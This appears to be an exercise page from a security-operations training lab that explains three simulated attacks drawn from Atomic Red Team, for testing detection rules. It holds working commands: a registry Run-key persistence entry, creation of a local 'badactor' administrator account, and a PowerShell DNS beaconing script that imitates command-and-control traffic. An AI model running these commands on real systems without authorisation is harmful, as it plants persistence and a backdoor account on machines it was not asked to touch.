# Task 6.1: Understand the attacks

{: .important }
> **You will perform no actions in this exercise.**  These instructions are only an explanation of the attacks you will perform in the next exercise. Please read this page carefully.

The attack patterns are based on [an open-source project](https://github.com/redcanaryco/atomic-red-team "https://github.com/redcanaryco/atomic-red-team").

## Attack 1 - Persistence with Registry Key Add

Attackers will add a program in the Run Registry key. This achieves persistence by making the program run every time the user logs on.

```nocopy
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

## Attack 2 - User Add and Elevate Privilege

Attackers will add new users and elevate the new user to the Administrators group. This enables the attacker to logon with a different account that is privileged.

```nocopy
net user badactor /add
net user badactor Passw0rd123!@# /add
net localgroup administrators badactor /add
```


## Attack 3 - DNS / C2 

Attacker will send a large volume of DNS queries to a command and control (C2) server. The intent is to trigger threshold-based detection on the number of DNS queries either from a single source system or to a single target domain.

```nocopy
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```
